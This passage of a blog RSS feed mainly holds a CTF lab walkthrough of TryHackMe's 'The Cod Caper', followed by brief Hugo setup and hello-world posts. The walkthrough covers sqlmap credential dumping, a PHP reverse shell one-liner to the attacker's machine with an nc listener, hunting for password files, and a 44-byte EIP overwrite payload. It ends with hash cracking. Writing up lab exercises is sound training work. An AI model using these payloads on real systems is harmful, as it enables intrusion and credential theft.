<pre><code class="language-cli" data-lang="cli">  gobuster dir --url TARGET_IP --wordlist /usr/share/wordlists/dirb/big.txt -x &quot;php,txt,html&quot; | grep 200
</code></pre><p>The  <code>| grep 200</code> is for filter the results only for http 200 code.</p>

    <img src="/images/thecodcaper/gobuster.JPG"  class="center"  style="border-radius: 5px;"  />


<p>Both modes will lead us to a <code>.php</code> file with an &ldquo;Administrator Login&rdquo; web page.</p>

    <img src="/images/thecodcaper/admin.JPG"  class="center"  style="border-radius: 8px;"  />


<h2 id="task-4-web-exploitation">Task 4. Web Exploitation</h2>
<p>Now we have an administrator page but we don&rsquo;t have credentials to log in. So let&rsquo;s try some SQL injection using the  <code>sqlmap</code>.</p>

    <img src="/images/thecodcaper/sql.jpg"  class="center"  style="border-radius: 8px;"  />


<pre><code class="language-cli" data-lang="cli">  sqlmap -u http://10.10.41.158/administrator.php --forms --dump
</code></pre><p>Flags used:</p>
<p><code>-u</code> = Specifies which url to attack.</p>
<p><code>--forms</code> = Automatically selects parameters from <!-- raw HTML omitted --> elements on the page.</p>
<p><code>--dump</code> = Used to retrieve data from the db once SQLI is found.</p>
<p>As result we got a username and a pass:</p>

    <img src="/images/thecodcaper/cred.jpg"  class="center"  style="border-radius: 8px;"  />


<p>Finally we can login into <code>/administrator.php</code> page then we get a &ldquo;Run Command&rdquo; page:</p>

    <img src="/images/thecodcaper/run.jpg"  class="center"  style="border-radius: 8px;"  />


<h2 id="task-5-command-execution">Task 5. Command Execution</h2>
<p>Since we have a form to run commands, let&rsquo;s run some basic command as <code>ls</code></p>
<p>It&rsquo;s working!! 
We have the result:</p>

    <img src="/images/thecodcaper/files.jpg"  class="center"  style="border-radius: 8px;"  />


<p>That command give us the answer for the first question in the task</p>
<p>With the ability to run commands we should try some reverse shell.
We know that server uses <code>php</code> then let&rsquo;s try a <code>php</code> reverse shell on it.
This is one way, but feel free to try another kind of reverse shell: python or nc.
Net Cat will probably works too, since the intro of that particular task told us that the server has nc enable.</p>
<p>We need to open a port in our machine:</p>
<pre><code class="language-cli" data-lang="cli">nc -vnlp 12345
</code></pre><p>Php reverse shell sintax:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;OUR_MACHINE_IP&#34;,PORT);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</code></pre></div><p>Edit the command above with the your machine ip and port, then copy and past to &ldquo;Run Command&rdquo; web page</p>
<p>Now we have a shell in the atacked machine we need a little bit of enumeration. Since we know that user  and we need to find more information about the users.</p>
<p>Lets check the <code>/home</code> directory:</p>

    <img src="/images/thecodcaper/home.jpg"  class="center"  style="border-radius: 8px;"  />


<p>We also can check in the <code>/etc/passwd</code>:</p>

    <img src="/images/thecodcaper/passwd.jpg"  class="center"  style="border-radius:15px;"  />


<p>After this, you will have to do some additional enumeration to find user&rsquo;s ssh key, or hidden password</p>
<p>We can check all files from the user with the command:</p>
<pre><code class="language-cli" data-lang="cli">  find / -user pingu -print 2&gt;/dev/null
</code></pre><p>Also we can search for file names like: pass, secret, private etc&hellip;.</p>
<pre><code class="language-cli" data-lang="cli">    find / -name pass* 2&gt;/dev/null
</code></pre><p>Take a good look at the results and find the file with user&rsquo;s password. 
You can also search for a <code>ssh</code> key file.</p>
<h2 id="task-6-linenum">Task 6. LinEnum</h2>
<p>We have a user/pass then we should <code>ssh</code> the machine.</p>

    <img src="/images/thecodcaper/ssh.jpg"  class="center"  style="border-radius: 8px;"  />


<p>We&rsquo;re logged in the user machine, however we need to find possibles ways to priv esc. Let&rsquo;s go with LinEnum.</p>


<blockquote>
LinEnum is a bash script that searches for possible ways to priv esc. It is incredibly popular due to the sheer amount of possible methods that it checks for, and often times Linenum is one of the first things to try when you get shell access.

</blockquote>


<p>Let&rsquo;s copy the <a href="https://github.com/rebootuser/LinEnum">Linenum</a> scritp:</p>
<pre><code class="language-cli" data-lang="cli"> scp {path to linenum} {user}@{host}:{path}
</code></pre><p>After that, run <code>linenum.sh</code></p>
<p>Go to SUID files section and find the answer to task 6 only question.</p>

    <img src="/images/thecodcaper/su.JPG"  class="center"  style="border-radius: 8px;"  />


<h2 id="task-7-pwndbg">Task 7. pwndbg</h2>
<p>We found an interesting file in the step above, moreover as explained in Tryhackme,this file expects 32 characters in the input now we used <code>gdb</code> to analyze.</p>
<pre><code class="language-cli" data-lang="cli">   gdb /opt/secret/root
</code></pre>
    <img src="/images/thecodcaper/gbd.jpg"  class="center"  style="border-radius: 8px;"  />


<p>The <code>pwndbg</code> has successfully been initialized. The next phase is to test if anything happens when we send more then 32 characters.</p>
<p>Type:</p>
<pre><code class="language-pwndbg" data-lang="pwndbg">  r &lt; &lt;(cyclic 50)
</code></pre><p>That command runs the program and provides 50 characters worth of &ldquo;cyclic&rdquo; input.
After running this command you will see something like this:</p>
<p>
    <img src="/images/thecodcaper/secret.jpg"  class="center"  style="border-radius: 8px;"  />




<blockquote>
Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time.*

*Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP.
</blockquote>

Luckily cyclic provides this functionality with the -l flag, running <code>cyclic -l {fault address}</code> will tell us exactly how many characters we need to provide we can overwrite EIP.&quot;</p>
<p>Running:</p>
<pre><code class="language-pwndbg" data-lang="pwndbg">     cyclic -l 0x6161616c 
</code></pre><p>Outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.</p>
<p>That&rsquo;s all we needed for pre-explotation!</p>
<h2 id="task-8-binary-exploitation-manually--9-the-pwntools-way">Task 8. Binary-Exploitation: Manually | 9. The pwntools way</h2>
<p>These two steps lead us to the same result, we&rsquo;re going with step 8 pass in this write up, but feel free to try the pwntools way.</p>


<blockquote>
Previously we figured out that we need to provide 44 characters of input, and then we can execute whatever part of the program we want. Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up
</blockquote>

<pre><code class="language-pwndbg" data-lang="pwndbg">        disassemble shell 
</code></pre>

<blockquote>
What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!
</blockquote>

<p>We can use python to do this:</p>
<p>Python conversion:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">     python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print &#34;A&#34;*44 + &#34;</span><span style="color:#ae81ff">\xcb\x84\x04\x08</span><span style="color:#e6db74">&#34;</span>
</code></pre></div>

<blockquote>

The command above  will output the payload we want, but it requires manually converting to little endian.
We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary*

</blockquote>

<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">      python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print &#34;A&#34;*44 + &#34;</span><span style="color:#ae81ff">\xcb\x84\x04\x08</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>secret<span style="color:#f92672">/</span>root
</code></pre></div><p>Save the hash!</p>
<h2 id="task-10-finish-the-job">Task 10. Finish the job</h2>
<p>Finally the last task. For this last one we need two things:</p>


<ul>
<li>The hash that we found in last task </li>
<li>A little bit of patience</li>

<p>Luckily hashcat supports cracking linux password hashes. You can find a list of hashcat modes <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a> and <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou</a>(a popular wordlist) here (if you don&rsquo;t already have it on your system yet)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"> hashcat -m <span style="color:#ae81ff">1800</span> -a <span style="color:#ae81ff">0</span> pingu.hash /usr/share/wordlists/rockyou.txt
</code></pre></div>
    <img src="/images/thecodcaper/5.gif"  class="center"  style="border-radius: 3px;"  />


<p>Flags:</p>
<p><code>-a</code> = Specify attack mode,attack modes can be found in the man page.</p>
<p><code>-m</code> = Specifies which mode to use, refer back to the list of modes</p>

    <img src="/images/thecodcaper/finalpass.jpg"  class="center"  style="border-radius: 8px;"  />


<p>We did it!</p>


<blockquote>

THM suggestion reading:
</blockquote>

<p><a href="http://docs.pwntools.com/en/stable/">http://docs.pwntools.com/en/stable/</a></p>
<p><a href="https://browserpwndbg.readthedocs.io/en/docs/">https://browserpwndbg.readthedocs.io/en/docs/</a></p>
]]></content>
        </item>
        
        <item>
            <title>Static web page with Hugo and Git Hub</title>
            <link>https://nmmorette.github.io/posts/2021/06/static-web-page-with-hugo-and-git-hub/</link>
            <pubDate>Wed, 30 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/06/static-web-page-with-hugo-and-git-hub/</guid>
            <description>Step 1. Install Hugo Go to Hugo releases and download the appropriate version for your OS and architecture.
More complete instructions are available at Install Hugo
Step 2. Configure your Git Hub Pages You need a github account for this step.
Step 3 Choose a theme In Hugo theme pages choose your favorite theme and download to your computer.
Unzip the files into the hugo default theme folder: ./Sites/YOURSITE/Themes
Then copy the content of config.</description>
            <content type="html"><![CDATA[<h2 id="step-1-install-hugo">Step 1. Install Hugo</h2>
<p>Go to <a href="https://github.com/spf13/hugo/releases">Hugo releases</a> and download the
appropriate version for your OS and architecture.</p>
<p>More complete instructions are available at <a href="https://gohugo.io/getting-started/installing/">Install Hugo</a></p>
<h2 id="step-2-configure-your-git-hub-pages">Step 2. Configure your Git Hub Pages</h2>
<p>You need a github account for this step.</p>
<h2 id="step-3-choose-a-theme">Step 3 Choose a theme</h2>
<p>In <a href="http://themes.hugo.io/">Hugo theme pages</a> choose your favorite theme and download to your computer.</p>
<p>Unzip the files into the hugo default theme folder: ./Sites/YOURSITE/Themes</p>
<p>Then copy the content of config.toml file in theme folder to the config.toml in your default site folder./Sites/YOUSITE/config.toml</p>
<h2 id="step-4-running-hugo">Step 4 Running Hugo</h2>
<p>With a terminal set in your default hugo webpage run:</p>
<pre><code>hugo -D
</code></pre>
<p>Hugo will building your page acording with the selected theme.</p>
<p>Open a terminal in your site page and start hugo</p>
<pre><code>hugo server
</code></pre>
<p>Then open your local site in: <code>http://localhost:1313</code></p>
<p>You can open yhe Site folder with Visual Studio and start code your site.</p>
<h2 id="step-4-upload-site">Step 4 Upload site</h2>
<p>Now  just upload the Public folder to your github.</p>
<p>Tips for Hugo&rsquo;s markdown:</p>
<p><a href="https://www.philipdaniels.com/blog/2016/hugo-blogging-cheatsheet/">https://www.philipdaniels.com/blog/2016/hugo-blogging-cheatsheet/</a></p>
]]></content>
        </item>
        
        <item>
            <title>Hello World</title>
            <link>https://nmmorette.github.io/posts/2021/06/hello-world/</link>
            <pubDate>Fri, 25 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/06/hello-world/</guid>
            <description>Created with Hugo/hello-friend-ng theme and GitHub pages.</description>
            <content type="html"><![CDATA[<p>Created with Hugo/hello-friend-ng theme and GitHub pages.</p>
]]></content>
        </item>
        
    </channel>
</rss>
